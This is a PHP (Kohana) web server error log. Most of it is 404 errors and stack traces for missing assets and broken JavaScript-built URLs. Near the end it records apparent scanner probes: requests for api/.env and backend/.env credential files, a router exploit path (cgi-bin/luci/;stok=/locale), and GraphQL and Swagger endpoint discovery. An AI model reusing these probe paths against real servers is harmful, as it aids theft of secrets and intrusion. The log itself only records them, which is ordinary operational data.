#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 17:03:20 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/js-170518/datetimepicker/images/ui-bg_glass_55_fbf9ee_1x400.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 17:03:20 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/js-170518/datetimepicker/images/ui-bg_glass_55_fbf9ee_1x400.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 17:03:21 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/js-170518/datetimepicker/images/ui-icons_2e83ff_256x240.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 17:03:21 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/js-170518/datetimepicker/images/ui-icons_2e83ff_256x240.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 17:03:22 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/js-170518/datetimepicker/images/ui-icons_cd0a0a_256x240.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 17:03:22 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/js-170518/datetimepicker/images/ui-icons_cd0a0a_256x240.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 17:03:23 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/js-170518/datetimepicker/images/ui-bg_glass_75_e6e6e6_1x400.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 17:03:23 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/js-170518/datetimepicker/images/ui-bg_glass_75_e6e6e6_1x400.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 17:03:24 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/js-170518/datetimepicker/images/ui-bg_glass_65_ffffff_1x400.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 17:03:24 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/js-170518/datetimepicker/images/ui-bg_glass_65_ffffff_1x400.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 17:03:25 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/js-170518/datetimepicker/images/ui-bg_flat_75_ffffff_40x100.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 17:03:25 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/js-170518/datetimepicker/images/ui-bg_flat_75_ffffff_40x100.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 17:03:26 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/js-170518/datetimepicker/images/ui-icons_454545_256x240.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 17:03:26 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/js-170518/datetimepicker/images/ui-icons_454545_256x240.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 17:03:28 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/js-170518/datetimepicker/images/ui-icons_222222_256x240.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 17:03:28 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/js-170518/datetimepicker/images/ui-icons_222222_256x240.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 17:03:29 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/js-170518/datetimepicker/images/ui-icons_888888_256x240.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 17:03:29 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/js-170518/datetimepicker/images/ui-icons_888888_256x240.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 17:03:30 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/js-170518/datetimepicker/images/ui-bg_highlight-soft_75_cccccc_1x100.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 17:03:30 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/js-170518/datetimepicker/images/ui-bg_highlight-soft_75_cccccc_1x100.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 17:05:39 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/ckeditor/_source/adapters/ckeditor.js ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 17:05:39 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/ckeditor/_source/adapters/ckeditor.js ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 17:06:46 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/ckeditor/plugins/clipboard/dialogs/'+g+' ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 17:06:46 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/ckeditor/plugins/clipboard/dialogs/'+g+' ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 17:07:37 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/js/easyslider/images/05.jpg ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 17:07:37 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/js/easyslider/images/05.jpg ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 17:07:38 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/js/easyslider/images/01.jpg ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 17:07:38 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/js/easyslider/images/01.jpg ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 17:07:39 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/js/easyslider/images/04.jpg ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 17:07:39 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/js/easyslider/images/04.jpg ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 17:07:40 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/js/easyslider/images/02.jpg ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 17:07:40 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/js/easyslider/images/02.jpg ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 17:07:42 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/js/easyslider/images/03.jpg ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 17:07:42 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/js/easyslider/images/03.jpg ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 17:09:25 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: ""+this.getAttribute("swf")+"/" ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 17:09:25 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: ""+this.getAttribute("swf")+"/" ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 17:10:39 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/ckeditor/plugins/docprops/dialogs/'+m+' ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 17:10:39 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/ckeditor/plugins/docprops/dialogs/'+m+' ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 17:17:43 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL public/js/angular/plugins/x was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-24 17:17:43 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL public/js/angular/plugins/x was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 17:18:07 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/js/'+IMGPATH+'/loader.gif ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 17:18:07 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/js/'+IMGPATH+'/loader.gif ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 17:18:24 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/js/' + c.imageSrc + ' ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 17:18:24 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/js/' + c.imageSrc + ' ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 17:18:27 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/js/' + m.imageSrc + ' ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 17:18:27 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/js/' + m.imageSrc + ' ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 17:18:37 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL public/ckeditor/'+W+' was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-24 17:18:37 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL public/ckeditor/'+W+' was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 17:18:57 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/js/" + b[d.iconSrc] + " ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 17:18:57 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/js/" + b[d.iconSrc] + " ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 17:18:58 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/js/" + d.iconSrc(b) + " ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 17:18:58 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/js/" + d.iconSrc(b) + " ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 17:21:13 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/ckeditor/plugins/smiley/dialogs/',CKEDITOR.tools.htmlEncode(b.smiley_path+d[f]),' ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 17:21:13 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/ckeditor/plugins/smiley/dialogs/',CKEDITOR.tools.htmlEncode(b.smiley_path+d[f]),' ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 17:23:51 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/js/'+this.hostname+'/public/images/arrow2.gif ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 17:23:51 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/js/'+this.hostname+'/public/images/arrow2.gif ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 17:26:32 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/ckeditor/plugins/templates/dialogs/'+CKEDITOR.getUrl(l+k.image)+' ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 17:26:32 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/ckeditor/plugins/templates/dialogs/'+CKEDITOR.getUrl(l+k.image)+' ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 17:26:45 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL public/ckeditor/themes/default/'+j+' was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-24 17:26:45 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL public/ckeditor/themes/default/'+j+' was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 17:27:29 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL public/ckeditor/_source/core/' + item + ' was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-24 17:27:29 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL public/ckeditor/_source/core/' + item + ' was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 17:28:27 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/ckeditor/_source/plugins/menu/+ CKEDITOR.getUrl( this.icon ) + ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 17:28:27 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/ckeditor/_source/plugins/menu/+ CKEDITOR.getUrl( this.icon ) + ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 17:30:16 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/js-170518/' + c.imageSrc + ' ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 17:30:16 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/js-170518/' + c.imageSrc + ' ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 17:30:19 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/js-170518/' + m.imageSrc + ' ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 17:30:19 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/js-170518/' + m.imageSrc + ' ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 17:31:46 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/ckeditor/_source/plugins/templates/dialogs/' + CKEDITOR.getUrl( imagesPath + template.image ) + ' ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 17:31:46 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/ckeditor/_source/plugins/templates/dialogs/' + CKEDITOR.getUrl( imagesPath + template.image ) + ' ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 17:32:46 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/ckeditor/_source/plugins/button/, CKEDITOR.getUrl( this.icon ), ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 17:32:46 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/ckeditor/_source/plugins/button/, CKEDITOR.getUrl( this.icon ), ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 17:33:13 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/ckeditor/plugins/about/dialogs/+CKEDITOR.plugins.get( ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 17:33:13 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/ckeditor/plugins/about/dialogs/+CKEDITOR.plugins.get( ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 17:33:14 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL public/js/' +      URL_BASE +      ' was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-24 17:33:14 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL public/js/' +      URL_BASE +      ' was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 17:34:20 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/ckeditor/plugins/scayt/dialogs/'+window.scayt.getAboutInfo().logoURL+' ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 17:34:20 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/ckeditor/plugins/scayt/dialogs/'+window.scayt.getAboutInfo().logoURL+' ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 17:34:39 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/ckeditor/_source/plugins/smiley/dialogs/', CKEDITOR.tools.htmlEncode( config.smiley_path + images[ i ] ), ' ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 17:34:39 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/ckeditor/_source/plugins/smiley/dialogs/', CKEDITOR.tools.htmlEncode( config.smiley_path + images[ i ] ), ' ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 17:35:48 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: "javascript:void('",E,'/')" ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 17:35:48 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: "javascript:void('",E,'/')" ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 17:35:50 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/ckeditor/_source/plugins/flash/dialogs/'+ CKEDITOR.tools.htmlEncode( previewPreloader.getAttribute( 'src' ) )+ ' ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 17:35:50 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/ckeditor/_source/plugins/flash/dialogs/'+ CKEDITOR.tools.htmlEncode( previewPreloader.getAttribute( 'src' ) )+ ' ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 17:39:59 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/ckeditor/' + CKEDITOR.getUrl( '_source/core/loader.js' ) + ' ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 17:39:59 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/ckeditor/' + CKEDITOR.getUrl( '_source/core/loader.js' ) + ' ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 17:40:01 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/ckeditor/_source/plugins/scayt/dialogs/' + window.scayt.getAboutInfo().logoURL + ' ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 17:40:01 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/ckeditor/_source/plugins/scayt/dialogs/' + window.scayt.getAboutInfo().logoURL + ' ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 17:48:37 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/ckeditor/_source/plugins/docprops/dialogs/' + previewSrc + ' ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 17:48:37 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/ckeditor/_source/plugins/docprops/dialogs/' + previewSrc + ' ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 17:56:29 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: api/.env ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 17:56:29 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: api/.env ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 17:56:30 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: backend/.env ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 17:56:30 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: backend/.env ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 18:05:43 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: favicon.ico ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 18:05:43 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: favicon.ico ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 18:07:44 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: cgi-bin/luci/;stok=/locale ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 18:07:44 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: cgi-bin/luci/;stok=/locale ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 18:09:04 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL graphql was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-24 18:09:04 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL graphql was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 18:09:06 --- ERROR: ErrorException [ 8 ]: Undefined offset: 3 ~ APPPATH/classes/controller/api.php [ 50 ]
2025-10-24 18:09:06 --- STRACE: ErrorException [ 8 ]: Undefined offset: 3 ~ APPPATH/classes/controller/api.php [ 50 ]
--
#0 /var/www/html/application/classes/controller/api.php(50): Kohana_Core::error_handler(8, 'Undefined offse...', '/var/www/html/a...', 50, Array)
#1 [internal function]: Controller_Api->action_index()
#2 /var/www/html/system/classes/kohana/request/client/internal.php(118): ReflectionMethod->invoke(Object(Controller_Api))
#3 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#4 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#5 /var/www/html/index.php(115): Kohana_Request->execute()
#6 {main}
2025-10-24 18:09:07 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL api/graphql was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 111 ]
2025-10-24 18:09:07 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL api/graphql was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 111 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 18:09:08 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL graphql/api was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-24 18:09:08 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL graphql/api was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 18:09:10 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL api/gql was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 111 ]
2025-10-24 18:09:10 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL api/gql was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 111 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 18:09:11 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: swagger-ui.html ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 18:09:11 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: swagger-ui.html ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
